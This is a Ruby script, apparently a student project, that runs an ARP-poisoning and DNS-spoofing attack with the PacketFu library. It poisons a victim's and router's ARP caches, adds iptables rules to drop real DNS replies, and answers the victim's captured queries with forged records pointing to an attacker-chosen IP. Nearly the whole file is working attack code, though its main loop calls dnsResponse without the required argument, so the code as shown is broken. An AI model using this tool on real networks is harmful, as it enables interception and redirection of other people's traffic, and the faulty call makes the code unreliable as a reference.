#!/usr/bin/ruby
require 'rubygems'
require 'packetfu'
require 'thread'

# Print usage of DNS Spoofing Application
unless (ARGV.size == 2 || ARGV.size==3)
	puts "Usage: ruby #{$0} Interface Victim-IP [Spoofer Web IP]"
	puts "Example: ruby #{$0} em1 192.168.0.2"
	puts "Default Spoofer Web IP is twitter.com at 199.59.150.39"
	exit
end

# ------------------------------------------------------------------------------------------------------------------
# -- SOURCE FILE: dnsspoof.rb
# -- 
# -- FUNCTIONS: def init(intface, victimIP)
# --		def revertArpPackets() 
# --		def spoofThread(arp_packet_victim, arp_packet_router)
# --		def getDomain(payload)
# -- 		def dnsResponse(spoofIP)
# --
# --
# -- DATE: 2014/11/02
# -- 
# -- REVISIONS: (Date and Description)
# -- 
# -- DESIGNER: Luke Tao, Ian Lee
# -- 
# -- PROGRAMMER: Luke Tao, Ian Lee
# -- 
# -- NOTES: These functions serves as the fundamental basis for the DNS Spoofing Application.
# -------------------------------------------------------------------------------------------------------------------

# --------------------------------------------------------------------------------------------------------------------
# -- FUNCTION: init
# -- 
# -- DATE: 2014/11/02
# -- 
# -- REVISIONS: (Date and Description)
# -- 
# -- DESIGNER: Luke Tao, Ian Lee
# -- 
# -- PROGRAMMER: Luke Tao, Ian Lee
# -- 
# -- INTERFACE: def init(intface, victimIP)
# -- 
# -- RETURNS: void.
# -- 
# -- NOTES: This function sets up the network interface, as well as setting up the Attacker, Victim and Router's IP and
# --        their respective MAC addresses in order to start the DNS Spoofing Session. In addition, this function
# --	    enables IP forwarding and append the necessary firewall rules in order to drop legitimate DNS Response Packets.
# ----------------------------------------------------------------------------------------------------------------------
def init(intface, victimIP)

	@interface = intface
	@victimIP = victimIP
	@routerIP = "192.168.0.100"
	@srcMAC = PacketFu::Utils.whoami?(:iface => @interface)
	@victimMAC = PacketFu::Utils.arp(@victimIP, :iface => @interface)
	@routerMAC = PacketFu::Utils.arp(@routerIP, :iface => @interface)

	# Construct the target's packet
	@arp_packet_target = PacketFu::ARPPacket.new()
	@arp_packet_target.eth_saddr = @srcMAC[:eth_saddr]      	# sender's MAC address
	@arp_packet_target.eth_daddr = @victimMAC       		# target's MAC address
	@arp_packet_target.arp_saddr_mac = @srcMAC[:eth_saddr]  	# sender's MAC address
	@arp_packet_target.arp_daddr_mac = @victimMAC   		# target's MAC address
	@arp_packet_target.arp_saddr_ip = @routerIP        		# router's IP
	@arp_packet_target.arp_daddr_ip = @victimIP         		# target's IP
	@arp_packet_target.arp_opcode = 2                       	# arp code 2 == ARP reply
	 
	# Construct the router's packet
	@arp_packet_router = PacketFu::ARPPacket.new()
	@arp_packet_router.eth_saddr = @srcMAC[:eth_saddr]       	# sender's MAC address
	@arp_packet_router.eth_daddr = @routerMAC       		# router's MAC address
	@arp_packet_router.arp_saddr_mac = @srcMAC[:eth_saddr]   	# sender's MAC address
	@arp_packet_router.arp_daddr_mac = @routerMAC   		# router's MAC address
	@arp_packet_router.arp_saddr_ip = @victimIP         		# target's IP
	@arp_packet_router.arp_daddr_ip = @routerIP       		# router's IP
	@arp_packet_router.arp_opcode = 2                        	# arp code 2 == ARP reply

	# Initialize IP Forwarding
	`echo 1 > /proc/sys/net/ipv4/ip_forward`

	# Append Firewall rules to drop legitimate DNS Responses
	`iptables -A FORWARD -p UDP --dport 53 -j DROP`
	`iptables -A FORWARD -p TCP --dport 53 -j DROP`

end

# --------------------------------------------------------------------------------------------------------------------
# -- FUNCTION: revertArpPackets
# -- 
# -- DATE: 2014/11/02
# -- 
# -- REVISIONS: (Date and Description)
# -- 
# -- DESIGNER: Luke Tao, Ian Lee
# -- 
# -- PROGRAMMER: Luke Tao, Ian Lee
# -- 
# -- INTERFACE: def revertArpPackets()
# -- 
# -- RETURNS: void.
# -- 
# -- NOTES: After the DNS Spoofing Session is done, this function is called on interrupt and it will send the proper
# -- 	    ARP packets to the victim and the router in order to realign the ARP tables.
# ----------------------------------------------------------------------------------------------------------------------
def revertArpPackets()
	
	#Construct the target's packet
	arp_packet_target = PacketFu::ARPPacket.new()
	arp_packet_target.eth_saddr = @routerMAC 
	arp_packet_target.eth_daddr = @victimMAC 
	arp_packet_target.arp_saddr_mac = @routerMAC
	arp_packet_target.arp_daddr_mac = @victimMAC
	arp_packet_target.arp_saddr_ip = @routerIP
	arp_packet_target.arp_daddr_ip = @victimIP
	arp_packet_target.arp_opcode = 2
	 
	# Construct the router's packet
	arp_packet_router = PacketFu::ARPPacket.new()
	arp_packet_router.eth_saddr = @victimMAC
	arp_packet_router.eth_daddr = @routerMAC
	arp_packet_router.arp_saddr_mac = @victimMAC
	arp_packet_router.arp_daddr_mac = @routerMAC
	arp_packet_router.arp_saddr_ip = @victimIP 
	arp_packet_router.arp_daddr_ip = @routerIP
	arp_packet_router.arp_opcode = 2
	
	# Send ARP Packets to Victim and Router
	arp_packet_target.to_w(@interface)
	arp_packet_router.to_w(@interface)
	
end

# --------------------------------------------------------------------------------------------------------------------
# -- FUNCTION: spoofThread
# -- 
# -- DATE: 2014/11/02
# -- 
# -- REVISIONS: (Date and Description)
# -- 
# -- DESIGNER: Luke Tao, Ian Lee
# -- 
# -- PROGRAMMER: Luke Tao, Ian Lee
# -- 
# -- INTERFACE: def spoofThread(arp_packet_victim, arp_packet_router)
# -- 
# -- RETURNS: void.
# -- 
# -- NOTES: This thread is being initialized so that the ARP packets are consistently sending to the victim and router
# --	    in order for the DNS spoofing to work properly.
# ----------------------------------------------------------------------------------------------------------------------
def spoofThread(arp_packet_victim, arp_packet_router)

	caught=false
	while caught==false do
		sleep 2
		arp_packet_victim.to_w(@interface)
		arp_packet_router.to_w(@interface)
	end
end

# --------------------------------------------------------------------------------------------------------------------
# -- FUNCTION: getDomain
# -- 
# -- DATE: 2014/11/02
# -- 
# -- REVISIONS: (Date and Description)
# -- 
# -- DESIGNER: Luke Tao, Ian Lee
# -- 
# -- PROGRAMMER: Luke Tao, Ian Lee
# -- 
# -- INTERFACE: def getDomain(payload)
# -- 
# -- RETURNS: Domain Name String
# -- 
# -- NOTES: Once a DNS Query packet has been captured, this function is being called to parse out the domain name
# --	    and return the domain name string.
# ----------------------------------------------------------------------------------------------------------------------
def getDomain(payload)
	domainName = ""
	
	while true

		# Get length of domain name section
		length = payload[0].unpack('c*')[0]
		#length = payload[0].to_i

		if(length != 0)

			# Add domain section to overall domain name string
			domainName += payload[1, length] + "."
			payload = payload[length + 1..-1]
		else
			# Return overall domain name string
			return domainName = domainName[0, domainName.length - 1]
		end
	end
	puts "Domain Info: " + domainName
end

# --------------------------------------------------------------------------------------------------------------------
# -- FUNCTION: dnsResponse
# -- 
# -- DATE: 2014/11/02
# -- 
# -- REVISIONS: (Date and Description)
# -- 
# -- DESIGNER: Luke Tao, Ian Lee
# -- 
# -- PROGRAMMER: Luke Tao, Ian Lee
# -- 
# -- INTERFACE: def dnsResponse(spoofIP)
# -- 
# -- RETURNS: void.
# -- 
# -- NOTES: Once a packet has been captured and a domain name is verified, this function is called to create a DNS
# --	    response packet, append multiple payloads such as the Transaction ID, Domain Name, Spoofed IP, etc. and send
# --	    the response packet to the victim. 
# ----------------------------------------------------------------------------------------------------------------------
def dnsResponse(spoofIP)
	udp_packet = PacketFu::UDPPacket.new(:config => @srcMAC, 
					     :udp_src => @packet.udp_dst, 
					     :udp_dst => @packet.udp_src)

	# Create UDP Packet
	udp_packet.eth_daddr = @victimMAC
	udp_packet.ip_daddr = @victimIP
	udp_packet.ip_saddr = @packet.ip_daddr
	udp_packet.udp_dst = @packet.udp_src

	# Parse Transaction ID
	udp_packet.payload = @packet.payload[0, 2]

	udp_packet.payload += "\x81\x80" + "\x00\x01\x00\x01" + "\x00\x00\x00\x00"

	# Parse Domain Name
	@domain.split('.').each do |section|
		udp_packet.payload += section.length.chr
		udp_packet.payload += section
	end

	udp_packet.payload += "\x00\x00\x01\x00\x01"
	udp_packet.payload += "\xc0\x0c"
	udp_packet.payload += "\x00\x01\x00\x01"
	udp_packet.payload += "\x00\x00\x00\x22"
	udp_packet.payload += "\x00\x04"

	#ip = @srcMAC[:ip_saddr].split('.')
	
	domain_IP = spoofIP.split('.')
	payload_domain = [domain_IP[0].to_i, domain_IP[1].to_i, domain_IP[2].to_i, domain_IP[3].to_i].pack('c*')

	# Append the Domain Name payload
	udp_packet.payload += payload_domain

	# Calculate the packet
	udp_packet.recalc

	# Send packet
	udp_packet.to_w(@interface)
		puts "DNS Response Sent."

end

# --------------------------------------------------------------------------------------------------------------------
# -- FUNCTION: Main
# -- 
# -- DATE: 2014/11/02
# -- 
# -- REVISIONS: (Date and Description)
# -- 
# -- DESIGNER: Luke Tao, Ian Lee
# -- 
# -- PROGRAMMER: Luke Tao, Ian Lee
# -- 
# -- INTERFACE: N/A
# -- 
# -- RETURNS: void.
# -- 
# -- NOTES: Main entry into script that takes command line arguments and starts the DNS Spoofing by capturing packets.
# ----------------------------------------------------------------------------------------------------------------------
begin

	# Parse Network Interface and Victim IP command line arguments
	intface = ARGV[0]
	victIP = ARGV[1]
	
	# Set Spoof IP from command line. Otherwise, set to default IP.
	if(ARGV.size == 3)
		spoofIP = ARGV[2]
	else
		spoofIP = "199.59.150.39" # Default Twitter IP
	end

	puts "Victim IP: " + victIP
	puts "Interface: " + intface
	puts "Spoofed to: " + spoofIP

	# Initialize Network Interface and Victim's IP
	init(intface, victIP)


	puts "Source MAC: " + @srcMAC[:eth_saddr].to_s
	puts "Dest MAC: " + @victimMAC.to_s
	puts "Router's MAC: " + @routerMAC.to_s

	# Spawn ARP Poisoning Thread
	puts "Initiating ARP thread..."
	arp_spoof_thread = Thread.new{spoofThread(@arp_packet_target, @arp_packet_router)}


	# Initialize DNS Query Capture
	capture = PacketFu::Capture.new(:iface => @interface, 
					:start => true, 
					:promisc => true, 
					:filter => "src #{@victimIP} and udp port 53 and udp[10]&128 = 0",
					:save => true)

	puts "Capturing DNS Queries..."
	capture.stream.each do |packet|
		puts "Captured packet"

		# Parse Packet and Get Domain Name from Packet
		@packet = PacketFu::Packet.parse(packet)
		@domain = getDomain(@packet.payload[12..-1])
		if @domain.nil?
			puts "No domain name found"
			next
		end
		puts "DNS Query for: " + @domain

		# Send DNS Response back
		dnsResponse
	end
	arp_spoof_thread.join

	# Catch interrupt
	rescue Interrupt
		puts "\nDNS spoof interrupt detected."
		
		# Kill Thread and Revert Network Settings back to normal
		Thread.kill(arp_spoof_thread)
		revertArpPackets()

		# Disable IP Forwarding
		`echo 0 > /proc/sys/net/ipv4/ip_forward`

		# Delete Firewall Rules
		`iptables -D FORWARD -p UDP --dport 53 -j DROP`
		`iptables -D FORWARD -p TCP --dport 53 -j DROP`
		exit 0

end
